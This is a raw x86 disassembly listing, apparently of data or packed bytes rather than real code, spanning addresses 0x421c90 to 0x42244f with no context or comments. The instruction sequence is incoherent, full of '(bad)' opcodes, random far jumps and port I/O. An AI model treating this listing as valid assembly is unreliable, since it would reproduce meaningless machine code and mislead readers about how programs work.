  421c90:	stos   DWORD PTR es:[edi],eax
  421c91:	imul   eax,DWORD PTR es:[eax],0xffffffee
  421c95:	add    BYTE PTR [ebx],dl
  421c97:	or     DWORD PTR [edi-0x1cae4140],edx
  421c9d:	cmp    BYTE PTR ds:0x50f0034b,0x69
  421ca4:	fld    QWORD PTR [ebp-0x24]
  421ca7:	in     al,dx
  421ca8:	sar    DWORD PTR [edi+0x0],0x57
  421cac:	cs sbb edi,esi
  421caf:	sar    DWORD PTR [esi+0x808f835],0x23
  421cb6:	mov    ecx,0x20451f04
  421cbb:	pop    edx
  421cbc:	mov    ecx,0x7593b1fd
  421cc1:	fdivp  st(2),st
  421cc3:	sub    al,0x6b
  421cc5:	dec    ecx
  421cc6:	xchg   BYTE PTR [ecx-0x1e],bl
  421cc9:	add    bh,BYTE PTR [eax+0xe]
  421ccc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421ccd:	jle    0x421ce8
  421ccf:	jnp    0x421c7c
  421cd1:	arpl   bp,sp
  421cd3:	sbb    ch,BYTE PTR [ebp-0x71]
  421cd6:	mov    edi,0x8c41ae6a
  421cdb:	adc    al,BYTE PTR [edi]
  421cdd:	sub    BYTE PTR [edi-0x71701c],bh
  421ce3:	in     eax,0x58
  421ce5:	test   DWORD PTR [edx+0x3acd580d],eax
  421ceb:	mov    ebx,0xc618cbd6
  421cf0:	out    dx,al
  421cf1:	lock inc eax
  421cf3:	sub    dl,dl
  421cf5:	mov    DWORD PTR [edx-0x703b0955],edx
  421cfb:	int3   
  421cfc:	cdq    
  421cfd:	ds scas al,BYTE PTR es:[edi]
  421cff:	push   ss
  421d00:	loopne 0x421d1e
  421d02:	xchg   edi,eax
  421d03:	mov    ecx,DWORD PTR [edx]
  421d05:	outs   dx,BYTE PTR ds:[esi]
  421d06:	loope  0x421ca8
  421d08:	test   DWORD PTR [ebp+ebx*2-0x31],0xf7657f15
  421d10:	xchg   ebp,eax
  421d11:	repz push ecx
  421d13:	pop    es
  421d14:	dec    esp
  421d15:	imul   BYTE PTR [ecx]
  421d17:	push   cs
  421d18:	popf   
  421d19:	rol    BYTE PTR [edi],cl
  421d1b:	out    dx,al
  421d1c:	fist   DWORD PTR [esi-0x1e3622eb]
  421d22:	les    ebp,FWORD PTR [ebp-0x755994d4]
  421d28:	sub    al,0x43
  421d2a:	inc    ecx
  421d2b:	xchg   ecx,esi
  421d2d:	xor    esi,DWORD PTR cs:[edi+0x75a59c49]
  421d34:	push   ebx
  421d35:	shr    BYTE PTR [edi+edx*8],cl
  421d38:	sbb    ah,BYTE PTR [edx-0x24]
  421d3b:	sahf   
  421d3c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421d3d:	(bad)  
  421d3f:	mov    esp,0xd4c54625
  421d44:	fstp   DWORD PTR [esi-0x47]
  421d47:	jmp    0xf3bf155b
  421d4c:	dec    esi
  421d4d:	sbb    ecx,DWORD PTR [ebx+0x4e49f2b]
  421d53:	std    
  421d54:	adc    al,0x69
  421d56:	mov    edi,0x8de50118
  421d5b:	jb     0x421d79
  421d5d:	outs   dx,BYTE PTR ds:[esi]
  421d5e:	mov    esp,0xc69fd235
  421d63:	popa   
  421d64:	mov    es,WORD PTR [ecx+0x212dac95]
  421d6a:	pop    ebx
  421d6b:	int3   
  421d6c:	std    
  421d6d:	mov    BYTE PTR [esi+ecx*8],al
  421d70:	loope  0x421de7
  421d72:	add    al,0x7
  421d74:	int3   
  421d75:	cmp    edx,DWORD PTR [edx+0x7f]
  421d78:	sub    dl,ah
  421d7a:	push   edi
  421d7b:	loope  0x421dc9
  421d7d:	dec    esi
  421d7e:	(bad)  
  421d7f:	jl     0x421d9c
  421d81:	jo     0x421d52
  421d83:	dec    ecx
  421d84:	xlat   BYTE PTR ds:[ebx]
  421d85:	ficomp DWORD PTR [edi+0x4c303b27]
  421d8b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421d8c:	sub    eax,0x2a33966d
  421d91:	mov    ds,WORD PTR [eax+0x5f1a41df]
  421d97:	jbe    0x421d21
  421d99:	jmp    0xeb33f528
  421d9e:	imul   edx,DWORD PTR [edx+eax*8+0x44],0x7087b162
  421da6:	ins    BYTE PTR es:[edi],dx
  421da7:	fadd   DWORD PTR [ebx+esi*1]
  421daa:	sub    esp,ecx
  421dac:	inc    ebx
  421dad:	jb     0x421d37
  421daf:	sar    DWORD PTR [esi-0x4f],1
  421db2:	jmp    0x421d5b
  421db4:	es scas eax,DWORD PTR es:[edi]
  421db6:	stc    
  421db7:	out    dx,eax
  421db8:	or     ah,al
  421dba:	pop    eax
  421dbb:	add    esp,0x9
  421dbe:	loop   0x421da1
  421dc0:	or     ebp,0x7c
  421dc3:	xchg   DWORD PTR [esi],ebp
  421dc5:	aad    0xcb
  421dc7:	xchg   ebp,eax
  421dc8:	addr16 inc ecx
  421dca:	mov    bh,0xec
  421dcc:	mov    edi,0xf3c4b582
  421dd1:	inc    esp
  421dd2:	rcl    esi,cl
  421dd4:	es dec edx
  421dd6:	or     al,0x2a
  421dd8:	fldenv [eax]
  421dda:	push   ss
  421ddb:	or     al,0x3b
  421ddd:	sahf   
  421dde:	in     al,0xa1
  421de0:	cmp    BYTE PTR [edx+0x58],ah
  421de3:	xchg   ebx,eax
  421de4:	xchg   edx,eax
  421de5:	sbb    esp,DWORD PTR [esi+0x216e0851]
  421deb:	inc    esp
  421dec:	loope  0x421dee
  421dee:	xchg   esi,eax
  421def:	dec    eax
  421df0:	or     al,BYTE PTR [ebp-0x16]
  421df3:	xor    edi,ebp
  421df5:	ficomp DWORD PTR [edi*2+0x7cedef64]
  421dfc:	sub    DWORD PTR [eax+0x69],eax
  421dff:	arpl   WORD PTR [ebx],cx
  421e01:	es push ebx
  421e03:	sbb    al,0x2c
  421e05:	jmp    0x421db4
  421e07:	jmp    0x421de7
  421e09:	sahf   
  421e0a:	add    edx,DWORD PTR [eax+0x7f]
  421e0d:	jo     0x421e35
  421e0f:	out    dx,eax
  421e10:	xchg   BYTE PTR [ecx-0x13e8eff2],bl
  421e16:	jae    0x421e81
  421e18:	fdivr  DWORD PTR [esi+0x1df3058a]
  421e1e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421e1f:	push   ebp
  421e20:	push   ebx
  421e21:	int3   
  421e22:	scas   eax,DWORD PTR es:[edi]
  421e23:	gs cdq 
  421e25:	aad    0x2b
  421e27:	mov    esp,0x15aa0b32
  421e2c:	imul   eax,DWORD PTR [edi-0x20],0xffffff88
  421e30:	out    0xc4,eax
  421e32:	jnp    0x421dca
  421e34:	inc    edi
  421e35:	mov    dl,bh
  421e37:	dec    esi
  421e38:	or     al,0x5f
  421e3a:	arpl   bp,di
  421e3c:	loope  0x421e68
  421e3e:	jg     0x421e34
  421e40:	test   al,0x2
  421e42:	out    dx,eax
  421e43:	inc    ecx
  421e44:	inc    esp
  421e45:	into   
  421e46:	jg     0x421e48
  421e48:	popa   
  421e49:	(bad)  
  421e4a:	scas   eax,DWORD PTR es:[edi]
  421e4b:	fisttp WORD PTR [edi+0x60dcc458]
  421e51:	xchg   ebx,eax
  421e52:	pop    eax
  421e53:	sub    bh,ch
  421e55:	in     eax,0x2a
  421e57:	jge    0x421e21
  421e59:	dec    ebp
  421e5a:	sar    BYTE PTR [esi+ebp*8+0x3dfbc193],1
  421e61:	dec    edx
  421e62:	popa   
  421e63:	mov    dl,0xb
  421e65:	xor    bh,BYTE PTR [eax]
  421e67:	cli    
  421e68:	inc    eax
  421e69:	mov    cl,0xcc
  421e6b:	loope  0x421df0
  421e6d:	jnp    0x421e92
  421e6f:	dec    ecx
  421e70:	sar    BYTE PTR [esi-0x2208a036],cl
  421e76:	mov    dh,0xa4
  421e78:	lahf   
  421e79:	mov    es:0x6ca594fb,al
  421e7f:	sub    eax,0x5bb4eb06
  421e84:	xor    ah,BYTE PTR [ebx+eax*4+0x1fdef2bf]
  421e8b:	imul   edx,DWORD PTR [esi+edx*2],0x38
  421e8f:	ret    
  421e90:	scas   eax,DWORD PTR es:[edi]
  421e91:	jecxz  0x421e45
  421e93:	pop    ebp
  421e94:	add    esi,DWORD PTR [edi-0x142eb8c0]
  421e9a:	or     edx,edx
  421e9c:	aam    0x93
  421e9e:	dec    ebp
  421e9f:	gs push cs
  421ea1:	lds    ebx,FWORD PTR [esi+0x2]
  421ea4:	adc    DWORD PTR [eax-0x15],edx
  421ea7:	push   eax
  421ea8:	jecxz  0x421f01
  421eaa:	aas    
  421eab:	cmp    ch,BYTE PTR ds:0x1c68c2c
  421eb1:	clc    
  421eb2:	xchg   ebp,eax
  421eb3:	push   ebp
  421eb4:	xchg   ecx,eax
  421eb5:	xor    ch,dh
  421eb7:	sti    
  421eb8:	enter  0x5596,0x1d
  421ebc:	sbb    si,WORD PTR [eax-0x646f00a3]
  421ec3:	test   BYTE PTR [eax],ah
  421ec5:	cmp    dl,bh
  421ec7:	dec    edi
  421ec8:	loop   0x421f23
  421eca:	xchg   ecx,eax
  421ecb:	outs   dx,BYTE PTR ds:[esi]
  421ecc:	ss xchg edx,eax
  421ece:	dec    esp
  421ecf:	bound  eax,QWORD PTR [eax+0x5ad395ef]
  421ed5:	outs   dx,BYTE PTR ds:[esi]
  421ed6:	cmp    al,0x7d
  421ed8:	mov    ecx,0x6e77bfb0
  421edd:	aad    0x78
  421edf:	jo     0x421e6c
  421ee1:	mov    dh,0x8e
  421ee3:	xor    BYTE PTR [ebp-0x44a39510],0xb7
  421eea:	fwait
  421eeb:	pop    esp
  421eec:	inc    edx
  421eed:	sub    esp,ebp
  421eef:	push   ss
  421ef0:	dec    edi
  421ef1:	push   0x7d
  421ef3:	dec    esp
  421ef4:	fisttp DWORD PTR [ebp-0x43422677]
  421efa:	add    eax,0x6ef2b51c
  421eff:	push   ebx
  421f00:	dec    ebp
  421f01:	pop    ss
  421f02:	adc    DWORD PTR [esp+esi*4+0x71],ebx
  421f06:	stc    
  421f07:	es or  eax,0xc1e78a71
  421f0d:	add    ebp,ecx
  421f0f:	test   BYTE PTR [esi+0x2d12e738],bl
  421f15:	hlt    
  421f16:	cmc    
  421f17:	cli    
  421f18:	sbb    BYTE PTR [edi],dl
  421f1a:	cs std 
  421f1c:	inc    DWORD PTR [eax]
  421f1e:	adc    eax,0x91200cf7
  421f23:	je     0x421f04
  421f25:	or     DWORD PTR [ebx+0x6657f177],edi
  421f2b:	push   edi
  421f2c:	sbb    ch,BYTE PTR [ecx+0x428e56b4]
  421f32:	arpl   WORD PTR [ecx+ebp*4+0x8],bp
  421f36:	pop    ds
  421f37:	xchg   ebx,eax
  421f38:	lods   al,BYTE PTR ds:[esi]
  421f39:	sbb    BYTE PTR [edx-0x5b],bh
  421f3c:	addr16 nop
  421f3e:	je     0x421f0c
  421f40:	mov    WORD PTR [ebp-0x6a],ss
  421f43:	inc    ebx
  421f44:	(bad)  
  421f45:	out    0x2b,al
  421f47:	(bad)  
  421f48:	mov    ecx,es
  421f4a:	jl     0x421f6c
  421f4c:	imul   edx,DWORD PTR [ecx],0x3b
  421f4f:	rol    DWORD PTR [ebp-0x15c1f334],cl
  421f55:	ins    DWORD PTR es:[edi],dx
  421f56:	xchg   ebx,eax
  421f57:	dec    ebx
  421f58:	lods   al,BYTE PTR ds:[esi]
  421f59:	xchg   ecx,eax
  421f5a:	popa   
  421f5b:	fldcw  WORD PTR [edx-0x78]
  421f5e:	cmp    DWORD PTR [ebx+ebx*2+0x83dba15],ebx
  421f65:	xchg   DWORD PTR [ecx-0x2323d8de],esp
  421f6b:	mov    ds:0x5e307752,eax
  421f70:	sub    ch,BYTE PTR [edx]
  421f72:	in     al,dx
  421f73:	sub    ah,ah
  421f75:	mov    ecx,0x7213c1d7
  421f7a:	dec    dl
  421f7c:	(bad)  
  421f7d:	out    dx,al
  421f7e:	xchg   esp,eax
  421f7f:	jne    0x421f62
  421f81:	mov    edi,0x96a738e6
  421f86:	(bad)  
  421f87:	ins    BYTE PTR es:[edi],dx
  421f88:	pop    edx
  421f89:	push   ebp
  421f8a:	fucomi st,st(0)
  421f8c:	into   
  421f8d:	sub    DWORD PTR [ecx+0xcc60dd6],0x347df86e
  421f97:	add    eax,0xdf75d068
  421f9c:	lahf   
  421f9d:	pushf  
  421f9e:	mov    ebp,0xc2f7790d
  421fa3:	(bad)  
  421fa4:	mov    ebp,0x7397d53e
  421fa9:	and    bh,BYTE PTR [edx]
  421fab:	mov    cl,0xda
  421fad:	stc    
  421fae:	and    DWORD PTR [ecx+0x2836ab8f],edi
  421fb4:	nop
  421fb5:	fist   DWORD PTR [edx-0x5cb81ba8]
  421fbb:	pop    ss
  421fbc:	stc    
  421fbd:	adc    eax,0xad5b707a
  421fc2:	test   BYTE PTR [edx],bh
  421fc4:	pop    edi
  421fc5:	pop    edx
  421fc6:	cmp    ecx,ecx
  421fc8:	mov    ds:0x3914df13,al
  421fcd:	or     ebp,ebx
  421fcf:	jmp    0x63b9:0xa9bb68c0
  421fd6:	clc    
  421fd7:	out    dx,eax
  421fd8:	push   edi
  421fd9:	pop    ebp
  421fda:	les    edx,FWORD PTR [esi-0x13890dee]
  421fe0:	ja     0x421f9b
  421fe2:	adc    eax,0x772453aa
  421fe7:	(bad)  [ebx-0x7539c504]
  421fed:	xor    DWORD PTR [edi+0x4d8a2a7a],edx
  421ff3:	add    DWORD PTR [edx+0x29],edx
  421ff6:	(bad)  
  421ff7:	xchg   edx,eax
  421ff8:	scas   eax,DWORD PTR es:[edi]
  421ff9:	icebp  
  421ffa:	rcl    BYTE PTR [ecx-0x3ee9f987],0x66
  422001:	mov    bh,0x85
  422003:	jbe    0x421fe3
  422005:	add    dl,bl
  422007:	xor    al,BYTE PTR [ecx+esi*4]
  42200a:	pop    esp
  42200b:	and    bl,BYTE PTR [ecx]
  42200d:	shl    DWORD PTR [ecx+ecx*4+0x3a32174f],0x8d
  422015:	push   ds
  422016:	popf   
  422017:	popa   
  422018:	xor    DWORD PTR [esi],ebp
  42201a:	fistp  QWORD PTR [eax]
  42201c:	ror    BYTE PTR [eax+edi*4+0x199dfafa],cl
  422023:	xchg   BYTE PTR [eax-0xd],bh
  422026:	adc    al,0xb8
  422028:	and    edx,0x1c
  42202b:	mov    dh,0xd2
  42202d:	inc    edi
  42202e:	(bad)  
  42202f:	fsubr  st,st(1)
  422031:	push   ebp
  422032:	fnstsw WORD PTR [ecx]
  422034:	sbb    BYTE PTR [edx-0x64dba2b9],bl
  42203a:	pop    eax
  42203b:	mov    bl,0xd6
  42203d:	xor    DWORD PTR [eax],ebx
  42203f:	lock and DWORD PTR [ecx+0x309fce57],ecx
  422046:	(bad)  
  422047:	sti    
  422048:	mov    ds:0x2416d698,eax
  42204d:	add    esp,DWORD PTR [eax+0x30]
  422050:	mov    ds:0xda40d6c5,eax
  422055:	icebp  
  422056:	jmp    0x4373:0x7aece994
  42205d:	lods   eax,DWORD PTR ds:[esi]
  42205e:	fdivr  QWORD PTR [ebx+eiz*1]
  422061:	cmc    
  422062:	lea    esp,[edx]
  422064:	xchg   ebx,eax
  422065:	fcomp  st(1)
  422067:	jp     0x422034
  422069:	add    eax,DWORD PTR [esi-0x65]
  42206c:	sbb    DWORD PTR [esi+0x66c6aa82],eax
  422072:	in     al,dx
  422073:	mov    dh,0x4f
  422075:	popa   
  422076:	mov    al,0x26
  422078:	add    BYTE PTR [esi],dh
  42207a:	mov    ebp,0xa77fbee2
  42207f:	sbb    BYTE PTR [esi-0xc439073],dl
  422085:	call   0xded1466f
  42208a:	sbb    BYTE PTR [eax+ebp*2+0x594ad8d8],ah
  422091:	cld    
  422092:	ret    0xbcd0
  422095:	cs dec edi
  422097:	pop    esp
  422098:	sub    al,0xe5
  42209a:	mov    BYTE PTR [ecx+esi*4-0x79937c40],bl
  4220a1:	push   cs
  4220a2:	add    esi,DWORD PTR [eax-0x11d11ca3]
  4220a8:	(bad)  
  4220aa:	addr16 ss push edi
  4220ad:	cmp    eax,0x74a7f592
  4220b2:	push   ds
  4220b3:	fcom   QWORD PTR [ebx+0x7c]
  4220b6:	pop    edi
  4220b7:	fiadd  DWORD PTR [esi-0x13]
  4220ba:	xor    al,0xca
  4220bc:	jo     0x42210d
  4220be:	or     al,0xc5
  4220c0:	test   al,0x25
  4220c2:	xchg   BYTE PTR [eax],ah
  4220c4:	mov    eax,0x764cc6e2
  4220c9:	or     al,0x69
  4220cb:	outs   dx,DWORD PTR ds:[esi]
  4220cc:	push   esp
  4220cd:	xchg   esi,eax
  4220ce:	push   esi
  4220cf:	jmp    0x8c7c:0x7addda9d
  4220d6:	and    BYTE PTR [edi-0x40],dh
  4220d9:	sbb    al,0x88
  4220db:	std    
  4220dc:	adc    DWORD PTR [eax-0x67d7f7b3],ebp
  4220e2:	push   ds
  4220e3:	in     al,dx
  4220e4:	xchg   edx,eax
  4220e5:	and    ebx,esp
  4220e7:	data16 int 0x53
  4220ea:	pop    ecx
  4220eb:	xor    eax,0x1c55658b
  4220f0:	out    dx,eax
  4220f1:	pop    esp
  4220f2:	lock ds mul ah
  4220f6:	jmp    0x85f4:0x1c7e7e5f
  4220fd:	ds or  eax,0xf4651dc
  422103:	adc    DWORD PTR [esp+edi*4-0x22],0x1578790d
  42210b:	(bad)  
  42210c:	imul   ebx,DWORD PTR [edi+ebx*8-0x68],0xfe3a9ec9
  422114:	(bad)  
  422115:	std    
  422116:	jmp    0xec0c727e
  42211b:	dec    BYTE PTR [edx+0xda35245]
  422121:	jno    0x422192
  422123:	inc    ebx
  422124:	neg    DWORD PTR ds:0x13f8d1cf
  42212a:	sahf   
  42212b:	mov    bh,0x87
  42212d:	lahf   
  42212e:	test   al,0x64
  422130:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422131:	push   es
  422132:	(bad)  
  422133:	sub    edi,DWORD PTR [ebp-0x49]
  422136:	iret   
  422137:	icebp  
  422138:	push   esi
  422139:	mov    bh,0x34
  42213b:	push   edi
  42213c:	lods   eax,DWORD PTR ds:[esi]
  42213d:	jno    0x422154
  42213f:	adc    dl,BYTE PTR [esi-0x1b]
  422142:	xlat   BYTE PTR ds:[ebx]
  422143:	mov    dh,0x77
  422145:	cmp    DWORD PTR [ebp+0x18dfbcde],esp
  42214b:	jmp    0x2dd4:0xbbe408bb
  422152:	pop    ebp
  422153:	pop    es
  422154:	in     al,dx
  422155:	dec    ecx
  422156:	push   0x16
  422158:	sub    eax,0xdb470ee9
  42215d:	jnp    0x42216f
  42215f:	mul    DWORD PTR [esi+0x1d647630]
  422165:	or     DWORD PTR [esi+0x1e],esp
  422168:	inc    ebp
  422169:	cld    
  42216a:	xor    dh,dh
  42216c:	gs loopne 0x42216f
  42216f:	sbb    edx,DWORD PTR [esi-0x60]
  422172:	ud1    edi,DWORD PTR [eax]
  422175:	or     eax,0x4e3b3d8c
  42217a:	outs   dx,DWORD PTR ds:[esi]
  42217b:	pop    ds
  42217c:	outs   dx,BYTE PTR ds:[esi]
  42217d:	mov    edi,0x5b5c55c6
  422182:	mov    ch,0xdd
  422184:	xor    al,BYTE PTR [esi+edx*8-0x6b0db339]
  42218b:	jo     0x422148
  42218d:	ds stos BYTE PTR es:[edi],al
  42218f:	add    eax,0x71c7345
  422194:	push   edi
  422195:	mov    dh,BYTE PTR [esp-0x5a]
  422199:	js     0x4221fa
  42219b:	pop    edx
  42219c:	leave  
  42219d:	or     DWORD PTR [eax-0x5f66ff4c],edx
  4221a3:	xor    bl,BYTE PTR es:[edx]
  4221a6:	imul   ecx,DWORD PTR [ebx+ebp*1-0x65e1e9e0],0x20
  4221ae:	scas   al,BYTE PTR es:[edi]
  4221af:	jne    0x4221da
  4221b1:	iret   
  4221b2:	int3   
  4221b3:	xor    DWORD PTR [eax-0x24],0x50
  4221b7:	mov    ds:0x51dee2cb,al
  4221bc:	sbb    eax,0x5f6c408
  4221c1:	dec    ecx
  4221c2:	mov    bl,0xdc
  4221c4:	pop    esp
  4221c5:	xor    eax,0xbebcea29
  4221ca:	shr    BYTE PTR [edi+0x33b8bd9e],cl
  4221d0:	add    al,0x60
  4221d2:	mov    eax,0x9bcb0117
  4221d7:	adc    eax,0x64b06f35
  4221dc:	dec    esp
  4221dd:	lods   al,BYTE PTR ds:[esi]
  4221de:	in     al,dx
  4221df:	(bad)  
  4221e0:	mov    esp,0x7aa2aab4
  4221e5:	sbb    ebx,DWORD PTR [edx+0x79]
  4221e8:	adc    al,0x67
  4221ea:	pop    esp
  4221eb:	in     eax,dx
  4221ec:	xchg   esi,eax
  4221ed:	mov    ds,WORD PTR [ebp-0x253e6243]
  4221f3:	aad    0x73
  4221f5:	sbb    al,0xfe
  4221f7:	mov    bl,0x3b
  4221f9:	test   ch,dh
  4221fb:	sbb    DWORD PTR [ecx-0x4cb025a4],esp
  422201:	out    0xb8,al
  422203:	push   ecx
  422204:	inc    eax
  422205:	gs mov al,0x91
  422208:	test   eax,0xbc932085
  42220d:	(bad)  
  42220e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42220f:	pop    ds
  422210:	or     ah,bl
  422212:	cwde   
  422213:	pop    ss
  422214:	jmp    0x4221b5
  422216:	pusha  
  422217:	out    0xb4,al
  422219:	inc    ebp
  42221a:	pop    esp
  42221b:	push   ebp
  42221c:	xchg   ecx,eax
  42221d:	mov    ds:0x8e517066,eax
  422222:	xchg   esi,eax
  422223:	push   es
  422224:	add    al,0x3b
  422226:	call   0xd7cd:0x190b9aa
  42222d:	jno    0x422295
  42222f:	push   esp
  422230:	push   edx
  422231:	mov    DWORD PTR [ecx],edi
  422233:	out    0x9d,eax
  422235:	push   ss
  422236:	mov    dl,0x22
  422238:	scas   al,BYTE PTR es:[edi]
  422239:	(bad)  
  42223b:	xor    edx,DWORD PTR [edi]
  42223d:	popa   
  42223e:	add    DWORD PTR [ebx],eax
  422240:	sub    edi,DWORD PTR [ecx+0x7f244d2f]
  422246:	push   eax
  422247:	mov    ss,WORD PTR [ecx+0x24]
  42224a:	sti    
  42224b:	jp     0x4221d6
  42224d:	cdq    
  42224e:	cmp    eax,0x6e7460fb
  422253:	jne    0x4222cd
  422255:	sub    al,dh
  422257:	xchg   esp,eax
  422258:	cld    
  422259:	fnstcw WORD PTR [edx+ebx*4]
  42225c:	jge    0x42226a
  42225e:	aas    
  42225f:	fmul   QWORD PTR [edi-0x25a65552]
  422265:	xchg   esp,eax
  422266:	mov    al,ds:0xbde48133
  42226b:	call   FWORD PTR ds:0x31b57144
  422271:	or     al,0x7
  422273:	aaa    
  422274:	xor    al,0x4d
  422276:	fst    QWORD PTR [esi-0x1d25ce89]
  42227c:	pop    esi
  42227d:	sub    bl,al
  42227f:	push   cs
  422280:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422281:	push   cs
  422282:	je     0x422296
  422284:	scas   eax,DWORD PTR es:[edi]
  422285:	dec    ebx
  422286:	imul   edx,esi,0xa12c6fb7
  42228c:	pop    esi
  42228d:	inc    esp
  42228e:	mov    ss:0x568b0fc,eax
  422294:	cs ja  0x422310
  422297:	jle    0x4222ec
  422299:	xchg   esp,eax
  42229a:	mov    dh,0x20
  42229c:	lahf   
  42229d:	call   0x294985d2
  4222a2:	inc    esp
  4222a3:	outs   dx,DWORD PTR ds:[esi]
  4222a4:	push   ebx
  4222a5:	retf   
  4222a6:	dec    ebp
  4222a7:	sbb    BYTE PTR [edi],dl
  4222a9:	fisttp QWORD PTR [ecx]
  4222ab:	aad    0xec
  4222ad:	int    0x27
  4222af:	outs   dx,DWORD PTR ds:[esi]
  4222b0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4222b1:	push   ss
  4222b2:	(bad)  
  4222b3:	pop    edi
  4222b4:	(bad)  [edx-0x32d5fbdd]
  4222ba:	adc    al,0x76
  4222bc:	fld    DWORD PTR [eax+0x1]
  4222bf:	in     eax,dx
  4222c0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4222c1:	mov    eax,ds:0x1afe5d7f
  4222c6:	ficom  DWORD PTR [edi]
  4222c8:	jmp    DWORD PTR [ebp+0x17]
  4222cb:	fdiv   DWORD PTR [ecx]
  4222cd:	push   ecx
  4222ce:	push   edi
  4222cf:	or     BYTE PTR [esi-0x7f749723],bl
  4222d5:	xchg   BYTE PTR [eax],bl
  4222d7:	fist   WORD PTR [eax-0x56984932]
  4222dd:	jle    0x4222a8
  4222df:	mov    esi,0x4d63fe10
  4222e4:	ins    BYTE PTR es:[edi],dx
  4222e5:	popf   
  4222e6:	add    al,0xc7
  4222e8:	jne    0x422361
  4222ea:	out    dx,eax
  4222eb:	xchg   esp,eax
  4222ec:	or     ebx,DWORD PTR [ecx]
  4222ee:	je     0x4222e4
  4222f0:	(bad)  
  4222f1:	jmp    0x422323
  4222f3:	lods   eax,DWORD PTR ds:[esi]
  4222f4:	lea    ecx,[esi+esi*8-0xf16fa74]
  4222fb:	pop    esi
  4222fc:	in     eax,dx
  4222fd:	je     0x4222f0
  4222ff:	add    bh,BYTE PTR ds:[eax]
  422302:	sub    DWORD PTR [edx],edi
  422304:	sub    edi,DWORD PTR [edi+0xcd5d9e6]
  42230a:	leave  
  42230b:	sub    esp,edi
  42230d:	es inc ebp
  42230f:	add    BYTE PTR ds:0x7373ca8a,bl
  422315:	and    BYTE PTR [esp+ecx*8+0x31],ch
  422319:	ins    BYTE PTR es:[edi],dx
  42231a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42231b:	inc    edi
  42231c:	cs mov ebx,0x3ebb9301
  422322:	loope  0x42236d
  422324:	jbe    0x422356
  422326:	add    BYTE PTR [esi],dh
  422328:	and    al,0x57
  42232a:	mov    esi,0x758938
  42232f:	jmp    0x42231e
  422331:	xor    edx,DWORD PTR [esi+ebp*8-0x42]
  422335:	retf   0x43ad
  422338:	pop    esi
  422339:	je     0x4222be
  42233b:	test   eax,0x1d9a65aa
  422340:	push   esp
  422341:	mov    DWORD PTR [edi-0x6c],ebp
  422344:	or     ebx,DWORD PTR [ebp+edi*1-0x46908ae3]
  42234b:	sbb    DWORD PTR [edi],0x31785508
  422351:	pop    ss
  422352:	adc    edi,DWORD PTR [eax]
  422354:	jp     0x4222f5
  422356:	call   0xae773375
  42235b:	jmp    0xdd55:0x71d37558
  422362:	inc    edi
  422363:	xor    al,0x4d
  422365:	mov    WORD PTR [edx+0x62],?
  422368:	adc    al,0x24
  42236a:	pop    ss
  42236b:	std    
  42236c:	jbe    0x42235f
  42236e:	push   es
  42236f:	mov    ds:0x18e8bc12,eax
  422374:	sub    eax,0xab38c676
  422379:	dec    ecx
  42237a:	lods   eax,DWORD PTR ds:[esi]
  42237b:	lea    esp,[esi-0x72]
  42237e:	das    
  42237f:	cmp    BYTE PTR [esi-0x3b22504d],cl
  422385:	mov    cl,0xc5
  422387:	icebp  
  422388:	aad    0x7c
  42238a:	ret    
  42238b:	pop    edx
  42238c:	and    al,0xb0
  42238e:	mov    ebx,0xc7d5d29f
  422393:	out    0x88,al
  422395:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422396:	bound  ebx,QWORD PTR [edx+esi*2]
  422399:	jno    0x42232c
  42239b:	loope  0x422329
  42239d:	ror    ebp,1
  42239f:	ja     0x422352
  4223a1:	mov    cl,BYTE PTR [eax]
  4223a3:	loop   0x42238e
  4223a5:	jo     0x42233e
  4223a7:	and    BYTE PTR [ebp+0x15],bh
  4223aa:	gs mov ebp,0xcb6f1d48
  4223b0:	mov    dh,bl
  4223b2:	data16 outs dx,BYTE PTR ds:[esi]
  4223b4:	bound  ebp,QWORD PTR [ecx-0x2af58650]
  4223ba:	popa   
  4223bb:	gs jp  0x4223b1
  4223be:	mov    ebx,0x6bd64827
  4223c3:	sbb    bl,BYTE PTR [edi-0x42d21f3b]
  4223c9:	(bad)  
  4223ca:	in     al,0xfa
  4223cc:	cmp    esp,DWORD PTR [eax-0x2c]
  4223cf:	idiv   DWORD PTR [esi-0x65]
  4223d2:	shl    BYTE PTR [edx-0x3f],cl
  4223d5:	mov    ch,0x63
  4223d7:	sahf   
  4223d8:	shr    BYTE PTR [ecx+0x3c7e0d28],1
  4223de:	scas   eax,DWORD PTR es:[edi]
  4223df:	int    0xca
  4223e1:	xchg   edi,eax
  4223e2:	mov    ebp,0xb312909d
  4223e7:	mov    esi,0x8128f380
  4223ec:	sbb    DWORD PTR [ebp-0x4e],eax
  4223ef:	jo     0x42244b
  4223f1:	mov    bh,0x38
  4223f3:	ds jb  0x4223c8
  4223f6:	imul   ebp,DWORD PTR [edi+0x6bd87f42],0x315a875f
  422400:	icebp  
  422401:	adc    ebx,DWORD PTR [eax+eiz*4-0x5701752b]
  422408:	repnz inc esi
  42240a:	add    al,0xac
  42240c:	gs ja  0x422471
  42240f:	retf   
  422410:	lods   al,BYTE PTR ds:[esi]
  422411:	cmp    eax,DWORD PTR [eax+ebx*4]
  422414:	cli    
  422415:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422416:	and    cl,BYTE PTR [eax+0x2427083e]
  42241c:	std    
  42241d:	adc    DWORD PTR [edi],esp
  42241f:	mov    ch,BYTE PTR [ebp+0x6c4ad783]
  422425:	sub    BYTE PTR [esi+0x10090aed],cl
  42242b:	in     eax,dx
  42242c:	xor    BYTE PTR [ecx],cl
  42242e:	push   ds
  42242f:	lahf   
  422430:	add    ah,BYTE PTR [edx-0xb]
  422433:	mov    al,0x7f
  422435:	push   0xd5ee079c
  42243a:	loop   0x4223e5
  42243c:	jo     0x42240d
  42243e:	std    
  42243f:	sbb    eax,0x681d35c0
  422444:	push   ebp
  422445:	loope  0x42249c
  422447:	fbstp  TBYTE PTR ds:0x94459891
  42244d:	lahf   
  42244e:	nop
  42244f:	jnp    0x42245c
